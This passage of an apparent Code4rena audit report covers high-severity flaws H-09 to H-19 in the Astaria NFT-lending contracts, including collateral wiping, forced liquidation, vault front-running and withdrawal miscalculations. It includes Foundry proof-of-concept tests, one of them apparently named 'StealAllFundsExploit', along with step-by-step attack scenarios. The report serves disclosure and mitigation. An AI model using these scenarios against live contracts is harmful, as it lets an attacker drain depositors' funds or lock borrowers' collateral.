FakeToken.balanceOf(strategistOne));assertEq(FakeToken.balanceOf(strategistOne), 500 ether);}}
+Then run the forge test command as follows (replace$FORK_URLwith your RPC URL):
+forgetest--ffi --fork-url$FORK_URL--fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv
+The test will pass. I’ve added comments in the code explaining the steps.
+Note:The attack isn’t possible when using AstariaRouter
+Recommended Mitigation Steps
+In VaultImplementation’scommitToLienfunction, add the following validation:
+require(address(this) == params.lienRequest.strategy.vault,"INVALID VAULT");
+Run the PoC test above again, andtestPayWithDifferentAssetshould fail.
+SantiagoGregory (Astaria) confirmed
+
+[H-09] At the second time the nft is used as collateral to take a loan, the debt repayment via auction fund can be failed when liquidation
+Submitted byKIntern_NA
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143-L146
+When a user transfer an NFT toCollateralTokencontract, it will toggle the functionCollateralToken.onERC721Received(). In this function if there didn’t exist anyclearingHousefor thecollateralId, it will create a new one for that collateral.
+if(s.clearingHouse[collateralId] ==address(0)) {addressclearingHouse=ClonesWithImmutableArgs.clone(s.ASTARIA_ROUTER.BEACON_PROXY_IMPLEMENTATION(),abi.encodePacked(address(s.ASTARIA_ROUTER),uint8(IAstariaRouter.ImplementationType.ClearingHouse),collateralId));s.clearingHouse[collateralId] =clearingHouse;}
+The interesting thing of this technique is: there will bejust oneclearingHousebe used for each collateral no matter how many times the collateral is transferred to the contract. Even when the lien is liquidated / fully repayed, thes.clearingHouse[collateralId]remain unchanged.
+The question here is any stale datas inclearingHousefrom the previous time that the nft was used as collateral can affect the behavior of protocol when the nft was transfered to CollateralToken again?
+Let take a look at the functionClearingHouse._execute(). In this function, the implementation usessafeApprove()to approvepayment - liquidatorPaymentamount for theTRANSFER_PROXY.
+ERC20(paymentToken).safeApprove(address(ASTARIA_ROUTER.TRANSFER_PROXY()),payment-liquidatorPayment);
+thesafeApprovefunction will revert if the allowance was set from non-zero value to non-zero value. This will incur some potential risk for the function like example below:
+NFT x is transferred toCollateralTokento take loans and then it is liquidated.At time 10, functionClearingHouse._execute()was called and thepayment - liquidatorPayment > totalDebt. This will thepaymentToken.allowance[clearingHouse][TRANSFER_PROXY] > 0after the function ended.NFT x is transferred toCollateralTokenfor the second time to take a loans and then it is liquidated again.At time 15 (> 10), functionClearingHouse._execute()was called, but at this time, thesafeApprovewill revert since the previous allowance is different from 0
+Impact
+The debt can be repayed by auction funds when liquidation.
+Recommended Mitigation Steps
+Consider to useapproveinstead ofsafeApprove.
+androolloyd (Astaria) commented:
+We use the solmate library which doesn’t seem to have a check for approvals being set to 0.
+SantiagoGregory (Astaria) confirmed
+
+[H-10] Liquidation will fail if value set asliquidationInitialAsk>2**88-1, causing collateral to be permanently locked
+Submitted bykaden, also found byrvierdiiev
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L340
+When a lien is initially created, theliquidationInitialAskcan be set as any uint256 value >= the amount of underlying borrowed. Later on however, if the position is liquidated, an auction is created which casts theliquidationInitialAskvalue to a uint88. Taking a look at the function inSafeCastLib.sol, we can see that if the value is greater than the max uint88 value, execution is reverted:
+function safeCastTo88(uint256 x) internal pure returns (uint88 y) {require(x < 1 << 88);y = uint88(x);}
+This reversion prevents auctions from ever being initialized, and since the only way to retrieve the collateral after the loan has expired is through auction, the collateral is permanently locked in the contract.
+For reference, setting theinitialLiquidationAsk>309,485,009.8213451DAI would trigger this error, and with a lesser value or higher decimal collateral, this may require a much lower USD equivalent. Additionally, setting a price this high is not particularly unrealistic considering it’s the starting price for a dutch auction in which it should be intentionally priced much higher than it’s worth.
+Proof of Concept:
+We can create the following test inAstariaTest.t.solto verify:
+function testCannotLiquidateTooHighInitialAsk() public {TestNFT nft = new TestNFT(3);vm.label(address(nft), "nft");address tokenContract = address(nft);uint256 tokenId = uint256(1);address publicVault = _createPublicVault({strategist: strategistOne,delegate: strategistTwo,epochLength: 14 days});_lendToVault(Lender({addr: address(1), amountToLend: 50 ether}),publicVault);uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));ILienToken.Stack[] memory stack;(, stack) = _commitToLien({vault: publicVault,strategist: strategistOne,strategistPK: strategistOnePK,tokenContract: tokenContract,tokenId: tokenId,lienDetails: ILienToken.Details({maxAmount: 50 ether,rate: (uint256(1e16) * 150) / (365 days),duration: 10 days,maxPotentialDebt: 0 ether,liquidationInitialAsk: type(uint256).max}),amount: 5 ether,isFirstLien: true});uint256 collateralId = tokenContract.computeId(tokenId);skip(14 days); // end of loanvm.expectRevert();OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(stack,uint8(0));}
+Recommendation
+This can be avoided by using a uint256 as theauctionData.startAmount.
+SantiagoGregory (Astaria) confirmed
+
+[H-11] Malicious strategist could deny borrowers from repaying loan and force liquidation by setting a extremely high vault fee
+Submitted bypeakbolt, also found bykadenandcaventa
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471
+Issue:A malicious strategist can deny the repayment of loans by setting a extremely high vault fee during creation of a public vault. The high vault fee will cause a revert due to a failed integer conversion using SafeCastTo88(). This will lead to forced liquidation of the borrowers when the loans expire outstanding, making them lose their NFT collaterals. (Vault fee is an incentive awarded to strategist on each loan repayment,  where a percentage of the interest payment is allocated to the strategist, in terms of vault shares.)
+High Likelihood:The strategist could target borrowers by refinancing outstanding loans and transfering the loans to his high fee vault, which does not require the borrowers’ consents. This can be achieved as refinancing can be done by anyone and the logic only checks for better interest rate and duration, but not the vault fee. The borrowers will not be aware of the issue, until they attempt to repay the loan. Furthermore, the strategist could specifically target loans that are about to expire, giving little reaction time for borrowers to report the issue.
+Financial gain:With the ability to force a liquidation, the strategist can possibly stand to gain financially (e.g. by refinancing the loans with a lower liquidationInitialAsk and then bid for the NFT collateral (with high gas fee) during liquidation.
+Note: Even if there are no lenders willing to lend to the vault due to the high vault fee, the strategist still can lend to its own vault to faciliate the refinance.
+Proof of Concept
+The bug can be replicated by changing the test case. Set vaultFee parameter to a high value (e.g. 1e13) as shown below in the file /src/test/TestHelpers.t.sol.  Then run testBasicPublicVaultLoan() in AsteriaTest.t.sol. In this test case, we will see that the strategist could create a public vault with a high vaultFee as there is no validation check for it. And any borrower could still proceed to deposit their collateral and take loan without any issues as the vaultFee is only accessed upon loan repayment.
+function _createPublicVault(address strategist,address delegate,uint256 epochLength) internal returns (address publicVault) {vm.startPrank(strategist);//bpspublicVault = ASTARIA_ROUTER.newPublicVault(epochLength,delegate,address(WETH9),//uint256(0)uint256(1e13),              //to replicate the bug, change vaultFee parameter from 0 to a high value like 1e13false,new address[](0),uint256(0));vm.stopPrank();}
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/AstariaTest.t.sol#L90
+However, when the borrower attempts to repay the loan, it will revert due to a failed integer conversion. As the fee is too high, convertToShare() will return a value that exceeds 88-bit, causing the safeCastTo88() in _handleStrategistInterestReward() to fail.
+uint88 feeInShares = convertToShares(fee).safeCastTo88();
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605
+Recommended Mitigation Steps
+Check that the vaultFee is within a reasonable range during vault creation.
+SantiagoGregory (Astaria) confirmed via duplicate issue#378
+
+[H-12] Borrower can use liquidationInitialAsk to block future borrowers
+Submitted byobront
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L471-L489https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L153-L174
+When a new lien is taken (or bought out), one of the validations is to ensure that thepotentialDebtof each borrower on the stack is less than or equal to theirliquidationInitialAsk.
+if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);}
+In_appendStack()and_buyoutLien(), this is performed by iterating through the stack backwards, totaling up thepotentialDebt, and comparing it to each lien’sliquidationInitialAsk:
+for (uint256 i = stack.length; i > 0; ) {uint256 j = i - 1;newStack[j] = stack[j];if (block.timestamp >= newStack[j].point.end) {revert InvalidState(InvalidStates.EXPIRED_LIEN);}unchecked {potentialDebt += _getOwed(newStack[j], newStack[j].point.end);}if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);}unchecked {--i;}}
+However, only the first item on the stack has aliquidationInitialAskthat matters. When a new auction is started on Seaport,Router#liquidate()usesstack[0].lien.details.liquidationInitialAskas the starting price. The other values are meaningless, except in their ability to DOS future borrowers.
+Proof of Concept
+I set myliquidationInitialAskto be exactly the value of my loanA borrower has already borrowed on their collateral, and the first loan on the stack will determine the auction priceWhen they borrow from me, myliquidationInitialAskis recordedAny future borrows will check thatfutureBorrow + myBorrow <= myLiquidationInitialAsk, which is not possible for anyfutureBorrow > 0The result is that the borrower will be DOS’d from all future borrows
+This is made worse by the fact thatliquidationInitialAskis not a variable that can justify a refinance, so they’ll need to either pay back the loan or find a refinancier who will beat one of the other terms (rate or duration) in order to get rid of this burden.
+Recommended Mitigation Steps
+Get rid of all checks onliquidationInitialAskexcept for comparing the total potential debt of the entire stack to theliquidationInitialAskof the lien at position 0.
+Picodes (judge) commented:
+The scenario is correct but I don’t think it is of high severity at first sight, considering settingliquidationInitialAsktoo low only exposes the lender to a potential bad debt if the dutch auction settles below its debt
+Picodes (judge) commented:
+However, it seems from this and other findings that leaving theliquidationInitialAskat thelienlevel has multiple unintended side effects.
+SantiagoGregory (Astaria) confirmed
+
+[H-13] Anyone can wipe complete state of any collateral at any point
+Submitted byobront, also found byc7e7eff,KIntern_NA, andKoolex
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656
+The Clearing House is implemented as an ERC1155. This is used to settle up at the end of an auction. The Clearing House’s token is listed as one of the Consideration Items, and when Seaport goes to transfer it, it triggers the settlement process.
+This settlement process includes deleting the collateral state hash from LienToken.sol, burning all lien tokens, deleting the idToUnderlying mapping, and burning the collateral token.These changes effectively wipe out all record of the liens, as well as removing any claim the borrower has on their underlying collateral.
+After an auction, this works as intended. The function verifies that sufficient payment has been made to meet the auction criteria, and therefore all these variables should be zeroed out.
+However, the issue is that there is no check that this safeTransferFrom function is being called after an auction has completed. In the case that it is called when there is no auction, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0.
+This allows any user to call thesafeTransferFrom()function for any other user’s collateral. This will wipe out all the liens on that collateral, and burn the borrower’s collateral token, and with it their ability to ever reclaim their collateral.
+Proof of Concept
+The flow is as follows:
+safeTransferFrom(offerer, buyer, paymentToken, amount, data)_execute(offerer, buyer, paymentToken, amount)using the auctionStack in storage, it calculates the amount the auction would currently be listed atit confirms that the Clearing House has already received sufficient paymentTokens for this amountit then transfers the liquidator their payment (currently 13%)it callsLienToken#payDebtViaClearingHouse(), which pays back all liens, zeros out all lien storage and deletes the collateralStateHashif there is any remaining balance of paymentToken, it transfers it to the owner of the collateralit then callsCollateral#settleAuction(), which deletes idToUnderlying, collateralIdToAuction and burns the collateral token
+In the case where the auction hasn’t started, theauctionStackin storage is all set to zero. When it calculates the payment that should be made, it uses_locateCurrentAmount, which simply returnsendAmountifstartAmount == endAmount. In the case where they are all 0, this returns 0.
+The second check that should catch this occurs insettleAuction():
+if (s.collateralIdToAuction[collateralId] == bytes32(0) &&ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(s.idToUnderlying[collateralId].tokenId) !=s.clearingHouse[collateralId]) {revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);}
+However, this check accidentally uses an&&operator instead of a||. The result is that, even if the auction hasn’t started, only the first criteria is false. The second is checking whether the Clearing House owns the underlying collateral, which happens as soon as the collateral is deposited inCollateralToken.sol#onERC721Received():
+ERC721(msg.sender).safeTransferFrom(address(this),s.clearingHouse[collateralId],tokenId_);
+Recommended Mitigation Steps
+Change the check insettleAuction()from an AND to an OR, which will block any collateralId that isn’t currently at auction from being settled:
+if (s.collateralIdToAuction[collateralId] == bytes32(0) ||ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(s.idToUnderlying[collateralId].tokenId) !=s.clearingHouse[collateralId]) {revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);}
+SantiagoGregory (Astaria) confirmed
+
+[H-14] A malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault, thereby preventing the borrower from repaying all loans
+Submitted bycccz
+In LienToken.transferFrom, transferring lien tokens to the public vault is prohibited because variables such as liensOpenForEpoch are not updated when the public vault receives a lien token, which would prevent the borrower from repaying the loan in that lien token.
+functiontransferFrom(addressfrom,addressto,uint256id)publicoverride(ERC721,IERC721) {LienStoragestorages=_loadLienStorageSlot();if(_isPublicVault(s,to)) {revertInvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);}if(s.lienMeta[id].atLiquidation) {revertInvalidState(InvalidStates.COLLATERAL_AUCTION);}deletes.lienMeta[id].payee;emitPayeeChanged(id,address(0));super.transferFrom(from,to,id);}
+However, public vaults are created using the ClonesWithImmutableArgs.clone function, which uses thecreateopcode, which allows the address of the public vault to be predicted before it is created.
+https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
+assembly{instance :=create(0,ptr,creationSize)}
+This allows a malicious private vault to transfer lien tokens to the predicted public vault address in advance, and then call AstariaRouter.newPublicVault to create the public vault, which has a liensOpenForEpoch of 0.When the borrower repays the loan via LienToken.makePayment, decreaseEpochLienCount fails due to overflow in _payment, resulting in the liquidation of the borrower’s collateral
+}else{amount=stack.point.amount;if(isPublicVault) {// since the openLiens count is only positive when there are liens that haven't been paid off// that should be liquidated, this lien should not be counted anymoreIPublicVault(lienOwner).decreaseEpochLienCount(IPublicVault(lienOwner).getLienEpoch(end));}
+Consider the following scenario where private vault A provides a loan of 1 ETH to the borrower, who deposits NFT worth 2 ETH and borrows 1 ETH.Private Vault A creates Public Vault B using the account alice and predicts the address of Public Vault B before it is created and transfers the lien tokens to it.The borrower calls LienToken.makePayment to repay the loan, but fails due to overflow.The borrower is unable to repay the loan, and when the loan expires, the NFTs used as collateral are auctioned.
+Proof of Concept
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L847https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L731-L742https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
+Recommended Mitigation Steps
+In LienToken.transferFrom, require to.code.length >0, thus preventing the transfer of lien tokens to uncreated public vaults
+function transferFrom(address from,address to,uint256 id) public override(ERC721, IERC721) {LienStorage storage s = _loadLienStorageSlot();if (_isPublicVault(s, to)) {revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);}+  require(to.code.length > 0);if (s.lienMeta[id].atLiquidation) {revert InvalidState(InvalidStates.COLLATERAL_AUCTION);}delete s.lienMeta[id].payee;emit PayeeChanged(id, address(0));super.transferFrom(from, to, id);}
+androolloyd (Astaria) commented:
+The mitigation seems like it now blocks transfers to eoas.
+SantiagoGregory (Astaria) confirmed
+Picodes (judge) commented:
+Indeed the mitigation may have unintended consequences.
+
+[H-15] Wrong starting price when listing on Seaport for assets that has less than 18 decimals
+Submitted byKoolex
+According to Astaria’s docs:https://docs.astaria.xyz/docs/protocol-mechanics/loanterms
+Liquidation initial ask: Should the NFT go into liquidation, the initial price of the auction will be set to this value. Note that this set as a starting point for a dutch auction, and the price will decrease over the liquidation period. This figure is should also be specified in 10^18 format.
+The liquidation initial ask is specified in 18 decimals. This is then used as a starting price when the NFT goes under auction on OpenSea. However, if the asset has less than 18 decimals, then the starting price goes wrong to Seaport.
+This results in listing the NFT with too high price that makes it unlikely to be sold.
+Proof of Concept
+The starting price is set to the liquidation initial ask:
+listedOrder = s.COLLATERAL_TOKEN.auctionVault(ICollateralToken.AuctionVaultParams({settlementToken: stack[position].lien.token,collateralId: stack[position].lien.collateralId,maxDuration: auctionWindowMax,startingPrice: stack[0].lien.details.liquidationInitialAsk,endingPrice: 1_000 wei}));
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647
+Let’s assume the asset is USDC which has 6 decimals:
+Strategist signs a strategy with liquidationInitialAsk1000e18.Following the docs, this means the starting price is supposed to be1000USDCThe NFT is being liquidated1000e18 is passed to Seaport along with asset USDCSeaport lists the NFT, and the price will be too high as1000e18 will be1000000000000000USDC
+Recommended Mitigation Steps
+Either fetch the asset’s decimals on-chain or add it as a part of the strategy.Convert liquidationInitialAsk to the asset’s decimals before passing it as a starting price.
+SantiagoGregory (Astaria) confirmed
+
+[H-16] When Public Vault A buys out Public Vault B’s lien tokens, it does not increase Public Vault A’s liensOpenForEpoch, which would result in the lien tokens not being repaid
+Submitted bycccz, also found byJeiwan,0xbepresent, andchaduke
+Vault A can call buyoutLien to buy out Vault B’s lien tokens, which calls LienToken.buyoutLien
+functionbuyoutLien(ILienToken.Stack[]calldatastack,uint8position,IAstariaRouter.CommitmentcalldataincomingTerms)externalwhenNotPausedreturns(ILienToken.Stack[]memory, ILienToken.Stackmemory){...returnlienToken.buyoutLien(ILienToken.LienActionBuyout({position:position,encumber:ILienToken.LienActionEncumber({amount:owed,receiver:recipient(),lien:ROUTER().validateCommitment({commitment:incomingTerms,timeToSecondEpochEnd:_timeToSecondEndIfPublic()}),stack:stack
+In LienToken.buyoutLien, it will burn Vault B’s lien token and mint a new lien token for Vault A
+function_replaceStackAtPositionWithNewLien(LienStoragestorages,ILienToken.Stack[]calldatastack,uint256position,StackmemorynewLien,uint256oldLienId)internalreturns(ILienToken.Stack[]memorynewStack) {newStack=stack;newStack[position] =newLien;_burn(oldLienId);// @ audit: burn Vault B's lien tokendeletes.lienMeta[oldLienId];}...newLienId=uint256(keccak256(abi.encode(params.lien)));Pointmemorypoint=Point({lienId:newLienId,amount:params.amount.safeCastTo88(),last:block.timestamp.safeCastTo40(),end:(block.timestamp+params.lien.details.duration).safeCastTo40()});_mint(params.receiver,newLienId);// @ audit: mint a new lien token for Vault Areturn(newLienId,Stack({lien:params.lien,point:point}));}
+And, when Vault B is a public vault, the handleBuyoutLien function of Vault B will be called to decrease liensOpenForEpoch.However, when Vault A is a public vault, it does not increase the liensOpenForEpoch of Vault A.
+if(_isPublicVault(s,payee)) {IPublicVault(payee).handleBuyoutLien(IPublicVault.BuyoutLienParams({lienSlope:calculateSlope(params.encumber.stack[params.position]),lienEnd:params.encumber.stack[params.position].point.end,increaseYIntercept:buyout-params.encumber.stack[params.position].point.amount}));}...functionhandleBuyoutLien(BuyoutLienParamscalldataparams)publiconlyLienToken{VaultDatastorages=_loadStorageSlot();unchecked{uint48newSlope=s.slope-params.lienSlope.safeCastTo48();_setSlope(s,newSlope);s.yIntercept+=params.increaseYIntercept.safeCastTo88();s.last=block.timestamp.safeCastTo40();}_decreaseEpochLienCount(s,getLienEpoch(params.lienEnd.safeCastTo64()));// @audit: decrease liensOpenForEpochemitYInterceptChanged(s.yIntercept);}
+Since the liensOpenForEpoch of the public vault decreases when the lien token is repaid, and since the liensOpenForEpoch of public vault A is not increased, then when that lien token is repaid, _payment will fail due to overflow when decreasing the liensOpenForEpoch.
+}else{amount=stack.point.amount;if(isPublicVault) {// since the openLiens count is only positive when there are liens that haven't been paid off// that should be liquidated, this lien should not be counted anymoreIPublicVault(lienOwner).decreaseEpochLienCount(//  @audit: overflow hereIPublicVault(lienOwner).getLienEpoch(end));}
+Consider the following case.
+Public Vault B holds a lien token and B.liensOpenForEpoch == 1Public Vault A buys out B’s lien token for refinancing, B.liensOpenForEpoch == 0, A.liensOpenForEpoch == 0borrower wants to repay the loan, in the _payment function, the decreaseEpochLienCount function of Vault A will be called,A.liensOpenForEpoch--will trigger an overflow, resulting in borrower not being able to repay the loan, and borrower’s collateral will be auctioned off, but in the call to updateVaultAfterLiquidation function will also fail in decreaseEpochLienCount due to the overflow
+functionupdateVaultAfterLiquidation(uint256maxAuctionWindow,AfterLiquidationParamscalldataparams)publiconlyLienTokenreturns(addresswithdrawProxyIfNearBoundary) {VaultDatastorages=_loadStorageSlot();_accrue(s);unchecked{_setSlope(s,s.slope-params.lienSlope.safeCastTo48());}if(s.currentEpoch!=0) {transferWithdrawReserve();}uint64lienEpoch=getLienEpoch(params.lienEnd);_decreaseEpochLienCount(s,lienEpoch);//  @audit: overflow here
+As a result, the borrower cannot repay the loan and the borrower’s collateral cannot be auctioned off, thus causing the depositor of the public vault to suffer a loss
+Proof of Concept
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L843https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L640-L655
+Recommended Mitigation Steps
+In LienToken.buyoutLien, when the caller is a public vault, increase the decreaseEpochLienCount of the public vault.
+SantiagoGregory (Astaria) confirmed
+
+[H-17] FunctionprocessEpoch()in PublicVault would revert when most of the users withdraw their funds because of the underflow for new yIntercept calculation
+Submitted byunforgiven, also found byevanand0xbepresent
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L335https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L479-L493
+When users withdraw their vault tokens PublicVault mint WithdrawProxy’s shares token for them and at the end of the epoch PublicVault would calculated WithdrawProxy’s assets and update PublicVault assets and start the next epoch. if a lot of users withdraws their funds then the value of thetotalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)(the amount belongs to the WithdrawProxy) would be higher thanyInterceptand code would revert because of the underflow when setting the new value of theyIntercept. This would cause last users to not be able to withdraw their funds and contract epoch system to be broken for a while.
+Proof of Concept
+This is part ofprocessEpoch()code that calculates ratio between WithdrawProxy and PublicVault:
+function processEpoch() public {..........// reset liquidationWithdrawRatio to prepare for re calcualtions.liquidationWithdrawRatio = 0;// check if there are LPs withdrawing this epochif ((address(currentWithdrawProxy) != address(0))) {uint256 proxySupply = currentWithdrawProxy.totalSupply();s.liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply()).safeCastTo88();currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);uint256 expected = currentWithdrawProxy.getExpected();unchecked {if (totalAssets() > expected) {s.withdrawReserve = (totalAssets() - expected).mulWadDown(s.liquidationWithdrawRatio).safeCastTo88();} else {s.withdrawReserve = 0;}}_setYIntercept(s,s.yIntercept -totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18));// burn the tokens of the LPs withdrawing_burn(address(this), proxySupply);}
+As you can see in the line_setYIntercept(s, s.yIntercept - totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18))code tries to set new value foryInterceptbut This istotalAssets()code:
+function totalAssets()publicviewvirtualoverride(ERC4626Cloned)returns (uint256){VaultData storage s = _loadStorageSlot();return _totalAssets(s);}function _totalAssets(VaultData storage s) internal view returns (uint256) {uint256 delta_t = block.timestamp - s.last;return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);}
+So as you can seetotalAssets()can be higher thanyInterceptand if most of the user withdraw their funds(for example the last user) then the value ofliquidationWithdrawRatiowould be near1too and the value oftotalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)would be bigger thanyInterceptand call toprocessEpoch()would revert and code can’t start the next epoch and user withdraw process can’t be finished and funds would stuck in the contract.
+Tools Used
+VIM
+Recommended Mitigation Steps
+Prevent underflow by callingaccrue()in the begining of theprocessEpoch().
+SantiagoGregory (Astaria) confirmed via duplicate issue#408
+Picodes (judge) increased severity to High
+
+[H-18]PublicVault.processEpochcalculateswithdrawReserveincorrectly; Users can lose funds
+Submitted byrvierdiiev
+PublicVault.processEpoch calculates withdrawReserve incorrectly. As result user can receive less funds when totalAssets() <= expected from auction.
+Proof of Concept
+When users wants to withdraw fromPublicVaultthenWithdrawProxyis deployed andPublicVault.processEpochfunction is responsible to calculates.withdrawReserve.
+This amount depends on how many shares should be redeemed and if there is auction for the epoch.
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L343
+solidityfunction processEpoch() public {// check to make sure epoch is overif (timeToEpochEnd() > 0) {revert InvalidState(InvalidStates.EPOCH_NOT_OVER);}VaultData storage s = _loadStorageSlot();if (s.withdrawReserve > 0) {revert InvalidState(InvalidStates.WITHDRAW_RESERVE_NOT_ZERO);}WithdrawProxy currentWithdrawProxy = WithdrawProxy(s.epochData[s.currentEpoch].withdrawProxy);// split funds from previous WithdrawProxy with PublicVault if hasn't been alreadyif (s.currentEpoch != 0) {WithdrawProxy previousWithdrawProxy = WithdrawProxy(s.epochData[s.currentEpoch - 1].withdrawProxy);if (address(previousWithdrawProxy) != address(0) &&previousWithdrawProxy.getFinalAuctionEnd() != 0) {previousWithdrawProxy.claim();}}if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);}// reset liquidationWithdrawRatio to prepare for re calcualtions.liquidationWithdrawRatio = 0;// check if there are LPs withdrawing this epochif ((address(currentWithdrawProxy) != address(0))) {uint256 proxySupply = currentWithdrawProxy.totalSupply();s.liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply()).safeCastTo88();currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);uint256 expected = currentWithdrawProxy.getExpected();unchecked {if (totalAssets() > expected) {s.withdrawReserve = (totalAssets() - expected).mulWadDown(s.liquidationWithdrawRatio).safeCastTo88();} else {s.withdrawReserve = 0;}}_setYIntercept(s,s.yIntercept -totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18));// burn the tokens of the LPs withdrawing_burn(address(this), proxySupply);}// increment epochunchecked {s.currentEpoch++;}}
+s.liquidationWithdrawRatiodepends on how many shares exists inside WithdrawProxy. In case if amount of shares insideWithdrawProxyequal to amount of shares insidePublicVaultthat means that withdraw ratio is 100% and all funds from Vault should be sent toWithdrawProxy.
+In case if auction is in progress thenWithdrawProxy.getExpectedis not 0 and some amount of funds is expected from auction.
+unchecked{if(totalAssets() >expected) {s.withdrawReserve= (totalAssets() -expected).mulWadDown(s.liquidationWithdrawRatio).safeCastTo88();}else{s.withdrawReserve=0;}}
+This iss.withdrawReservecalculation. As you can see in case iftotalAssets() <= expectedthens.withdrawReserveis set to 0 and no funds will be sent to proxy. This is incorrect though.
+For example in the case when withdraw ratio is 100% all funds should be sent to the withdraw proxy, but because of that check, some part of funds will be still inside the vault and depositors will lose their funds. If for example totalAssets is 5eth and expected is 5 eth, then depositors will lose all 5 eth.
+This check is done in such way, because ofcalculations insideWithdrawProxy. But it’s not correct.
+Tools Used
+VsCode
+Recommended Mitigation Steps
+You need to check this logic again. Maybe you need to always sends.withdrawReserve = totalAssets().mulWadDown(s.liquidationWithdrawRatio).safeCastTo88()amount to the withdraw proxy. But then you need to rethink, how WithdrawProxy will handle yIntercept increase/decrease.
+
+[H-19] Vaults don’t verify that a strategy’s deadline has passed
+Submitted byRuhum
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L229-L266https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L439
+The vault doesn’t verify that a deadline hasn’t passed when a commitment is validated. Users are able to take out loans using strategies that have already expired. Depending on the nature of the strategy that can cause a loss of funds for the LPs.
+Proof of Concept
+When you take out a loan using the AstariaRouter, the deadline is verified:
+function_validateCommitment(RouterStoragestorages,IAstariaRouter.Commitmentcalldatacommitment,uint256timeToSecondEpochEnd)internalviewreturns(ILienToken.Lienmemorylien) {if(block.timestamp>commitment.lienRequest.strategy.deadline) {revertInvalidCommitmentState(CommitmentState.EXPIRED);}// ...
+But,VaultImplementation._validateCommitment()skips that check:
+function_validateCommitment(IAstariaRouter.Commitmentcalldataparams,addressreceiver)internalview{uint256collateralId=params.tokenContract.computeId(params.tokenId);ERC721CT=ERC721(address(COLLATERAL_TOKEN()));addressholder=CT.ownerOf(collateralId);addressoperator=CT.getApproved(collateralId);if(msg.sender!=holder&&receiver!=holder&&receiver!=operator&&!CT.isApprovedForAll(holder,msg.sender)) {revertInvalidRequest(InvalidRequestReason.NO_AUTHORITY);}VIDatastorages=_loadVISlot();addressrecovered=ecrecover(keccak256(_encodeStrategyData(s,params.lienRequest.strategy,params.lienRequest.merkle.root)),params.lienRequest.v,params.lienRequest.r,params.lienRequest.s);if((recovered!=owner() &&recovered!=s.delegate) ||recovered==address(0)) {revertIVaultImplementation.InvalidRequest(InvalidRequestReason.INVALID_SIGNATURE);}}
